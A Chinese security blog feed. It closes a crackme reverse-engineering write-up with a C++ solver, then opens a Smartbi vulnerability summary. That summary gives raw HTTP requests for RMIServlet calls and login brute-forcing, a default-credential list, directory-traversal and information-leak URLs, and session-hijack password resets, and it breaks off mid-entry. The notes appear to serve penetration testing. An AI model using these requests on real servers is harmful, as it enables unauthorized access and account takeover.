<h3 id="校验坐标"><a href="#校验坐标" class="headerlink" title="校验坐标"></a>校验坐标</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102638850.png" alt="image-20210125102638850"></p>
<p>接着将横坐标和0xE2做比较，将纵坐标和0x12C做比较，小于或等于跳转，那么就是说如果想让他不跳转，横纵坐标 必须大于这两个值。整个表单的原点是左上角，那么我们必须从右下角移入才能满足条件。</p>
<h3 id="再次校验图片和坐标"><a href="#再次校验图片和坐标" class="headerlink" title="再次校验图片和坐标"></a>再次校验图片和坐标</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102710719.png" alt="image-20210125102710719"></p>
<p>接着再次校验图片是否是Image2 Image2是性本善，然后校验横坐标和纵坐标，这一次必须从左下角移入才能满足条 件。然后再判断 [ebx+0x30C] 这个地址的值是否是 0x9 ，默认这个值是0x9，所以这里又是一层防护。只有满足了 [ebx+0x30C]这个地址的值是9，才能把ebx+0x310赋值为0xF94，也就是满足我们的第二层防护。</p>
<h2 id="分析第三层防护"><a href="#分析第三层防护" class="headerlink" title="分析第三层防护"></a>分析第三层防护</h2><p>接下来还是一样，要让[ebx+0x30C]这个地址的值不为9，查找所有常量。符合要求的只有第一条和第二条。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102744480.png" alt="image-20210125102744480"></p>
<p>而第一条跟进去发现这是之前分析过的表单创建的时候就被赋值为30C，所以目标不是这里，是第二条。</p>
<p>第二条跟进去，拉到函数头的位置</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102842402.png" alt="image-20210125102842402"></p>
<p>发现这里是Edit2的双击事件，而Edit2目前是禁用的，所以双击事件根本断不下来，这又是一层防护。</p>
<h2 id="分析第四层防护"><a href="#分析第四层防护" class="headerlink" title="分析第四层防护"></a>分析第四层防护</h2><p>想要破解第二层防护必须先破解第三层防护，想要破解第三层防护，就必须先破解第四层防护，这是在玩俄罗斯套娃 啊。那么我们这一步必须让Edit2控件变成启用状态。怎么做呢？利用刚才看到的控件ID。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102911173.png" alt="image-20210125102911173"></p>
<p>Edit2的控件ID是0x2F0，接着搜索所有常量。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102928655.png" alt="image-20210125102928655"></p>
<p>挨个点进去进行查找，经过排查发现真正的开启Edit2 控件的是第四个。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102945232.png" alt="image-20210125102945232"></p>
<p>这个函数并不长，是Panel1的双击事件，想要让Edit2控件被启用，就必须让eax+0x308这个地址被赋值为0x29D。 Panel是什么东西呢。打开一下DarkDe，中间的这个大按钮就是Panel1，注意不是图片是按钮。所以想要触发这个 事件必须是双击空白处才能让程序断下。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125102959965.png" alt="image-20210125102959965"></p>
<h2 id="分析第五层防护"><a href="#分析第五层防护" class="headerlink" title="分析第五层防护"></a>分析第五层防护</h2><p>0x308</p>
<p>查找常量，第三条，跟进去,这里是注册按钮的鼠标按下事件。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103022846.png" alt="image-20210125103022846"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103033990.png" alt="image-20210125103033990"></p>
<p>首先比较edx=0x230D，这个是直接能通过的，没有给咱下套，我还以为又套了一层。接着比较cl是1，cl的话必须是 右键单击，还是用猜，鼠标无非就量个参数，坐标和左右按键。eax+0x308的初始值是0x28E，右键单击一次增加 3，所以只要将注册按钮右键单击5次，第五层防护就算过了。</p>
<h2 id="破解第五层防护"><a href="#破解第五层防护" class="headerlink" title="破解第五层防护"></a>破解第五层防护</h2><p>右键单击五次注册按钮</p>
<h2 id="破解第四层防护"><a href="#破解第四层防护" class="headerlink" title="破解第四层防护"></a>破解第四层防护</h2><p>第五层防护已经过了，那么接下来来到没有解决的第四层。 鼠标右键单击五次注册按钮，然后等图片过了，双击大按钮，响应事件断下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103114930.png" alt="image-20210125103114930"></p>
<p>这个时候可以看到eax+0x308的值已经是29D了</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103132371.png" alt="image-20210125103132371" style="zoom: 50%;">

<p>Edit2编辑框也能正常使用了。</p>
<h2 id="破解第三层防护"><a href="#破解第三层防护" class="headerlink" title="破解第三层防护"></a>破解第三层防护</h2><p>Edit2编辑框的编辑框已经启用了，那么接下来双击编辑框</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103315446.png" alt="image-20210125103315446"></p>
<p>程序成功断下，接下来分析Edit2的双击事件。我们的目的要让[ebx+0x30C]被赋值为eax，达到破解第二层防护的条件</p>
<h3 id="分析Edit2双击事件"><a href="#分析Edit2双击事件" class="headerlink" title="分析Edit2双击事件"></a>分析Edit2双击事件</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103343496.png" alt="image-20210125103343496"></p>
<p>首先获取Edit2的内容，然后获取长度，长度必须等于8，然后比较第二个字符是否是0x5F，0x5F就是下划线。比较第六个字符是否是0x2C，0x2C就是“,”</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103400603.png" alt="image-20210125103400603"></p>
<p>获取Edit1的内容和长度，然后将长度+3之后除以3</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103420194.png" alt="image-20210125103420194"></p>
<p>比较余数，余数必须为0。就是说Edit1的长度必须为3的倍数。至此，Ddit2双击事件分析完成。</p>
<p>第一个编辑框长度必须是3的倍数，第二个编辑框第二个字符必须是下划线，第六个字符必须的逗号</p>
<h2 id="破解第二层防护"><a href="#破解第二层防护" class="headerlink" title="破解第二层防护"></a>破解第二层防护</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103516698.png" alt="image-20210125103516698"></p>
<p>当破解了第三层防护的时候，第二层防护的比较条件也就满足了。继续往下分析。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103540997.png" alt="image-20210125103540997"></p>
<p>接着往下走，程序会获取第一个编辑框的内容然后和ajj做比较，也就是说第一个编辑框必须为ajj。然后会把数字转成 字符串显示到控件。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103555696.png" alt="image-20210125103555696" style="zoom: 50%;">

<h2 id="破解第六层防护"><a href="#破解第六层防护" class="headerlink" title="破解第六层防护"></a>破解第六层防护</h2><p>接下来来到总验证的地方。也就是一开始的定时器，看看现在的校验情况如何。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103631516.png" alt="image-20210125103631516"></p>
<p>我们已经过掉了前三个验证，接下来要过掉第四个，也就是要让ebx+0x318等于ebx+0x314。那么要搞清楚0x318和 0x314这两个位置是怎么被赋值的</p>
<h3 id="分析0x318"><a href="#分析0x318" class="headerlink" title="分析0x318"></a>分析0x318</h3><p>搜索所有常量-&gt;0x318</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103703124.png" alt="image-20210125103703124"></p>
<p>除了第一个设置初始值，剩下的所有对这个地址的变量做加法运算。随便点进去第二个，增加二的位置</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103717455.png" alt="image-20210125103717455"></p>
<p>这里是图片1的鼠标按下的位置，而且显示的是注册不成功。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103733538.png" alt="image-20210125103733538"></p>
<p>首先判断鼠标按下的是左键还是右键，如果是左键+2，右键+0x11。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103752150.png" alt="image-20210125103752150"></p>
<p>再次回到所有常量的位置，那么规律也就出来了，这几个加法分别对应四张图片，根据点击的按键不同，加的值也不 同。0x318这个位置搞明白了，接下来去分析0x314。</p>
<h3 id="分析0x314"><a href="#分析0x314" class="headerlink" title="分析0x314"></a>分析0x314</h3><p>搜索所有常量-&gt;0x314。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103826835.png" alt="image-20210125103826835"></p>
<p>0x314被赋值的地方也有很多，分别对应五个值。这个几个地址相差的值比较小，说明是同一个函数，随便点进去一 个。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103844902.png" alt="image-20210125103844902"></p>
<p>这里是之前分析过的表单的鼠标移动事件，这个地址的值取决于eax的值，有四种情况第一种情况赋值为0x41，第二 种情况赋值为0x3D，第三种情况赋值为0x34，第三种情况赋值为0xDF。然后根据不同的情况，在界面上会显示一个 数字。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125103906565.png" alt="image-20210125103906565"></p>
<p>而eax的值来自于0x30C这个位置，又得继续往上找。</p>
<h2 id="破解第七层保护"><a href="#破解第七层保护" class="headerlink" title="破解第七层保护"></a>破解第七层保护</h2><p>接下来还是查找所有常量-&gt;0x30C</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125104018200.png" alt="image-20210125104018200"></p>
<p>来到给0x30C赋值的位置，这里是编辑框的双击事件，之前已经分析过了，但是我没有分析上面两个call具体是做什 么的。 第一个call是获取磁盘的剩余空间，然后将eax做一系列的处理，交给第二个call，第二个call是纯粹的算法了。 最后这两处结合，是根据显示的数字不同，然后对图片采用不同的点击方案。</p>
<h2 id="点击事件的编写"><a href="#点击事件的编写" class="headerlink" title="点击事件的编写"></a>点击事件的编写</h2><p>根据不同的数字导致的在不同图片时左右点击相加=314即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void CCM005Dlg::OnOK() </span><br><span class="line">&#123;</span><br><span class="line">        &#x2F;&#x2F; TODO: Add extra validation here</span><br><span class="line">         </span><br><span class="line">        &#x2F;&#x2F;CDialog::OnOK();</span><br><span class="line"> </span><br><span class="line">        char szKey[1024]&#x3D;&#123;0&#125;;</span><br><span class="line">        int n &#x3D; 0;</span><br><span class="line">        GetDlgItemText(IDC_EDIT1,szKey,1024);</span><br><span class="line">        if(!strlen(szKey))</span><br><span class="line">        &#123;</span><br><span class="line"> </span><br><span class="line">                MessageBox(&quot;请按照【前期步骤】获取正确数值后再生成方案！&quot;,&quot;友情提示&quot;);</span><br><span class="line">                return;</span><br><span class="line">        &#125;</span><br><span class="line">        n &#x3D; GetDlgItemInt(IDC_EDIT1);</span><br><span class="line">         </span><br><span class="line"> </span><br><span class="line">        switch(n)&#123;</span><br><span class="line">    case 1  :</span><br><span class="line">                n&#x3D;0x3D;</span><br><span class="line">                break; </span><br><span class="line">        case 2  :</span><br><span class="line">                n&#x3D;0x34;</span><br><span class="line">                break; </span><br><span class="line">        case 3  :</span><br><span class="line">                n&#x3D;0xDF;</span><br><span class="line">                break; </span><br><span class="line"> </span><br><span class="line">        default : &#x2F;&#x2F; 可选的</span><br><span class="line">                n&#x3D;0x41;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F;sprintf(szKey,&quot;%d&quot;,n);</span><br><span class="line">        &#x2F;&#x2F;SetDlgItemText(IDC_EDIT2,szKey);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                struct  image</span><br><span class="line">        &#123;</span><br><span class="line">                char szname[7];</span><br><span class="line">                int nNumber ;</span><br><span class="line">                int nLef;</span><br><span class="line">                int nRight;</span><br><span class="line">        &#125;;</span><br><span class="line">        image aImage[4]&#x3D;&#123;0&#125;;</span><br><span class="line"> </span><br><span class="line">        sprintf(aImage[0].szname,&quot;人之初&quot;);</span><br><span class="line">        aImage[0].nNumber &#x3D; 1;</span><br><span class="line">        aImage[0].nLef &#x3D; 0x2;</span><br><span class="line">        aImage[0].nRight &#x3D; 0x11;</span><br><span class="line">         </span><br><span class="line">        sprintf(aImage[1].szname,&quot;性本善&quot;);</span><br><span class="line">        aImage[1].nNumber &#x3D; 2;</span><br><span class="line">        aImage[1].nLef &#x3D; 0x3;</span><br><span class="line">        aImage[1].nRight &#x3D; 0x13;</span><br><span class="line">         </span><br><span class="line">        sprintf(aImage[2].szname,&quot;性相近&quot;);</span><br><span class="line">        aImage[2].nNumber &#x3D; 3;</span><br><span class="line">        aImage[2].nLef &#x3D; 0x5;</span><br><span class="line">        aImage[2].nRight &#x3D; 0x17;</span><br><span class="line">         </span><br><span class="line">        sprintf(aImage[3].szname,&quot;习相远&quot;);</span><br><span class="line">        aImage[3].nNumber &#x3D; 4;</span><br><span class="line">        aImage[3].nLef &#x3D; 0x7;</span><br><span class="line">        aImage[3].nRight &#x3D; 0x1B;</span><br><span class="line">&#x2F;************************************************************************&#x2F;</span><br><span class="line">&#x2F;* 设计原则，选择出点击次数最少的方案</span><br><span class="line">&#x2F;* iR作为大数数组下标,iL作为小数数组下标,j大数商,k小数商,求i+j最小值                                                                </span><br><span class="line">&#x2F;************************************************************************&#x2F;</span><br><span class="line">    int nRes &#x3D; 112;</span><br><span class="line">        int nIL &#x3D; 0;</span><br><span class="line">        int nIR &#x3D; 0;</span><br><span class="line">        int nJ &#x3D; 0;</span><br><span class="line">        int nK &#x3D;0 ;</span><br><span class="line">        for (int iL&#x3D;0;iL&lt;4;iL++)</span><br><span class="line">        &#123;</span><br><span class="line">                for (int iR&#x3D;0;iR &lt; 4;iR++)</span><br><span class="line">                &#123;</span><br><span class="line">                 </span><br><span class="line">                for (int j&#x3D;1;j&lt;&#x3D;14;j++)</span><br><span class="line">                &#123;</span><br><span class="line">                        for (int k &#x3D;0;k&lt;&#x3D;112;k++)</span><br><span class="line">                        &#123;</span><br><span class="line">                                 </span><br><span class="line">                                if ((aImage[iR].nRight*j + aImage[iL].nLef*k &#x3D;&#x3D; n) &amp;&amp; (nRes&gt; j+k))</span><br><span class="line">                                &#123;</span><br><span class="line">                    nIL &#x3D; iL;</span><br><span class="line">                    nIR &#x3D; iR;</span><br><span class="line">                                        nJ &#x3D; j;</span><br><span class="line">                                        nK &#x3D; k;</span><br><span class="line">                                        nRes &#x3D; j+k ;</span><br><span class="line">                                &#125;</span><br><span class="line">                                 </span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        sprintf(szKey,&quot;在“%s”图片时左键点击图片%d次\r\n\r\n在“%s”图片时右键点击图片%d次\r\n\r\n即可注册成功!&quot;,aImage[nIL].szname,nK,aImage[nIR].szname,nJ);</span><br><span class="line">        SetDlgItemText(IDC_EDIT2,szKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="校验步骤总结"><a href="#校验步骤总结" class="headerlink" title="校验步骤总结"></a>校验步骤总结</h2><p>1.创建文件，路径为: C:\ajj.126.c0m\j\o\j\o\ok.txt ，然后将 20 61 6A 6A D0 B4 B5 C4 43 4B 6D 65 D5 E6 C0 C3 21 FF FF 用十六进制编辑器写入到文本。 </p>
<p>\2. 鼠标右键点击五次注册按钮 </p>
<p>\3. 鼠标左键双击图片框的空白处 </p>
<p>\4. 用户名输入ajj </p>
<p>\5. 密码输入1_345,78(第二位必须的下划线，第六位必须的逗号，长度必须8位，其余随便)，然后鼠标左键双击 </p>
<p>\6. 在图片是性相近的时候，鼠标从右下角移入软件框内 </p>
<p>\7. 在图片是性本善的时候，鼠标从左下角移入软件框内 </p>
<p>\8. 根据显示的数字不同，最终的解决方案也不同，具体如下： </p>
<p>数字为0——在“习相远”图片时左键点击图片2次，在“人之初”图片时右键点击图片3次 </p>
<p>数字为1——在“习相远”图片时左键点击图片1次，在“习相远”图片时右键点击图片2次 </p>
<p>数字为2——在“性本善”图片时左键点击图片2次，在“性相近”图片时右键点击图片2次 </p>
<p>数字为3——在“习相远”图片时左键点击图片1次，在“习相远”图片时右键点击图片8次 </p>
<p>数字为4——在“习相远”图片时左键点击图片2次，在“人之初”图片时右键点击图片3次 </p>
<p>所有的步骤都执行完毕之后，等待计时器执行完成之后</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210125104121222.png" alt="image-20210125104121222" style="zoom: 50%;">

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/qq_38474570/article/details/89602599">https://blog.csdn.net/qq_38474570/article/details/89602599</a></p>
<p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;page=1&amp;tid=855172">https://www.52pojie.cn/forum.php?mod=viewthread&amp;page=1&amp;tid=855172</a></p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>crackme</tag>
      </tags>
  </entry>
  <entry>
    <title>Smartbi 漏洞总结</title>
    <url>/2021/01/18/WEB/Exploit/Smartbi-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="SmartBi简介"><a href="#SmartBi简介" class="headerlink" title="SmartBi简介"></a>SmartBi简介</h1><p>Smartbi是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI智能分析等大数据分析需求。该软件应用范围较广，据官网介绍，在全球财富500强的10家国内银行，有8家选用了Smartbi。</p>
<h1 id="登录入口"><a href="#登录入口" class="headerlink" title="登录入口"></a>登录入口</h1><p><a href="https://127.0.0.1/vision/mobileportal.jsp">https://127.0.0.1/vision/mobileportal.jsp</a></p>
<p><a href="https://127.0.0.1/vision/mobileX/login">https://127.0.0.1/vision/mobileX/login</a></p>
<p><a href="https://127.0.0.1/vision/index.jsp">https://127.0.0.1/vision/index.jsp</a></p>
<p>密码正确的情况下，部分平台无法登陆，此时设置user-agent为手机端就可以。</p>
<a id="more"></a>

<h1 id="SmartBi的两种传参方式"><a href="#SmartBi的两种传参方式" class="headerlink" title="SmartBi的两种传参方式"></a>SmartBi的两种传参方式</h1><h2 id="RMIServlet加密"><a href="#RMIServlet加密" class="headerlink" title="RMIServlet加密"></a>RMIServlet加密</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 148</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span class="line">encode&#x3D;zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+&#x2F;JV&#x2F;uuc&#39;(mKi(Kp719J(~K((~K(((pm719JhNp&#39;uKiMM(&#39;9&#x2F;uu&#x2F;ut&#x2F;uuXIw6--Qw1&#x2F;uu&#x2F;ut&#x2F;uu6QSS&#x2F;uu&#x2F;ut&#x2F;uuY!a0bp1uN&#x2F;uu&#x2F;utk4Qp&#x2F;JT</span><br></pre></td></tr></table></figure>

<h2 id="直接传输"><a href="#直接传输" class="headerlink" title="直接传输"></a>直接传输</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">encode&#x3D;zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+&#x2F;JV&#x2F;uuc&#39;(mKi(Kp719J(~K((~K(((pm719JhNp&#39;uKiMM(&#39;9&#x2F;uu&#x2F;ut&#x2F;uuXIw6--Qw1&#x2F;uu&#x2F;ut&#x2F;uu6QSS&#x2F;uu&#x2F;ut&#x2F;uuY!a0bp1uN&#x2F;uu&#x2F;utk4Qp&#x2F;JT</span><br></pre></td></tr></table></figure>

<p>ecode加密字段解密后为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UserService+updateUserForChange+[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure>

<p>等同于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">className&#x3D;UserService&amp;methodName&#x3D;updateUserForChange&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure>

<p>构造数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;index.jsp</span><br><span class="line">If-Modified-Since: 0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 148</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;848B4743452D02C5A53FECCA58C47299</span><br><span class="line"></span><br><span class="line">className&#x3D;UserService&amp;methodName&#x3D;updateUserForChange&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]</span><br></pre></td></tr></table></figure>

<h1 id="登录暴破"><a href="#登录暴破" class="headerlink" title="登录暴破"></a>登录暴破</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;RMIServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Linux; Android 8.0.0; PRA-LX3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.101 Mobile Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;mobileX&#x2F;login</span><br><span class="line">content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID&#x3D;1DA1DAA51469E646F97AD829F29A2B15</span><br><span class="line"></span><br><span class="line">className&#x3D;UserService&amp;methodName&#x3D;login&amp;params&#x3D;[&quot;admin&quot;,&quot;admin&quot;]</span><br></pre></td></tr></table></figure>

<p>抓取true/false字段</p>
<h1 id="401认证弱口令及敏感目录"><a href="#401认证弱口令及敏感目录" class="headerlink" title="401认证弱口令及敏感目录"></a>401认证弱口令及敏感目录</h1><h2 id="401弱口令"><a href="#401弱口令" class="headerlink" title="401弱口令"></a>401弱口令</h2><p>/vision目录下的文件都需要401认证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x2F;admin</span><br><span class="line">admin&#x2F;manager</span><br><span class="line">admin&#x2F;2manager</span><br><span class="line">mining&#x2F;admin</span><br><span class="line">demo&#x2F;demo</span><br><span class="line">manager&#x2F;demo</span><br><span class="line">manager&#x2F;admin</span><br><span class="line">user&#x2F;admin</span><br><span class="line">test&#x2F;admin</span><br><span class="line">huanan&#x2F;admin</span><br></pre></td></tr></table></figure>

<p>实测发现不论用户名输什么，只要密码正确即可</p>
<h2 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h2><p><a href="https://127.0.0.1/vision/version.txt">https://127.0.0.1/vision/version.txt</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2021-01-11 15:11:24</span><br></pre></td></tr></table></figure>

<p><a href="https://127.0.0.1/vision/packageinfo.txt">https://127.0.0.1/vision/packageinfo.txt</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Build Time:20200918153547 </span><br><span class="line">War Type:dist </span><br><span class="line">TAG:Branch_SmartbiV85_6_20190221 </span><br><span class="line">Version:8.5.658863.20385 </span><br><span class="line">VersionType:Smartbi Insight Edition c0d53d51438945fa5b9839b3e0111e660792d2e1 </span><br><span class="line">Spreadsheet fake</span><br></pre></td></tr></table></figure>

<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><a href="https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=%2F">https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=%2F</a></p>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><a href="https://127.0.0.1/vision/monitor/sysprops.jsp">https://127.0.0.1/vision/monitor/sysprops.jsp</a></p>
<p><a href="https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode">https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode</a></p>
<p><a href="https://127.0.0.1/vision/monitor/hardwareinfo.jsp">https://127.0.0.1/vision/monitor/hardwareinfo.jsp</a></p>
<h2 id="接口泄露（直接访问wsdl无需401）"><a href="#接口泄露（直接访问wsdl无需401）" class="headerlink" title="接口泄露（直接访问wsdl无需401）"></a>接口泄露（直接访问wsdl无需401）</h2><p><a href="https://127.0.0.1/vision/listwsdl.jsp">https://127.0.0.1/vision/listwsdl.jsp</a></p>
<p>提供资源目录树的访问功能<br><a href="https://127.0.0.1/vision/services/CatalogService?wsdl">https://127.0.0.1/vision/services/CatalogService?wsdl</a><br>SimpleReportService 提供灵活报表相关操作功能</p>
<p> <a href="https://127.0.0.1/vision/services/SimpleReportService?wsdl">https://127.0.0.1/vision/services/SimpleReportService?wsdl</a><br>BusinessViewService 提供数据集定义相关操作功能</p>
<p> <a href="https://127.0.0.1/vision/services/BusinessViewService?wsdl">https://127.0.0.1/vision/services/BusinessViewService?wsdl</a><br>DataSourceService 提供数据源相关操作功能</p>
<p> <a href="https://127.0.0.1/vision/services/DataSourceService?wsdl">https://127.0.0.1/vision/services/DataSourceService?wsdl</a><br>AnalysisReportService 提供多维分析相关操作功能</p>
<p> <a href="https://127.0.0.1/vision/services/AnalysisReportService?wsdl">https://127.0.0.1/vision/services/AnalysisReportService?wsdl</a><br>UserManagerService 提供用户相关操作，包括：读取/维护用户信息、读取/维护组信息、读取/维护角色信息、为用户和组分配角色等</p>
<p> <a href="https://127.0.0.1/vision/services/UserManagerService?wsdl">https://127.0.0.1/vision/services/UserManagerService?wsdl</a></p>
<h2 id="session劫持-重置用户密码（无需原密码）"><a href="#session劫持-重置用户密码（无需原密码）" class="headerlink" title="session劫持+重置用户密码（无需原密码）"></a>session劫持+重置用户密码（无需原密码）</h2><p><a href="https://127.0.0.1/vision/monitor/listsessions.jsp">https://127.0.0.1/vision/monitor/listsessions.jsp</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112181111262.png" alt="image-20210112181111262"></p>
<p>[<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112140616396.png" alt="image-20210112140616396"></p>
<p>理论上重置成功，返回为true，但是实际测试过程中修改后的密码既不是改之前的密码，也不是修改后的密码，过一段时间自动重置为原来的密码。</p>
<p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112142701281.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112142701281.png" alt="image-20210112142701281"></a></p>
<p>数据包:</p>
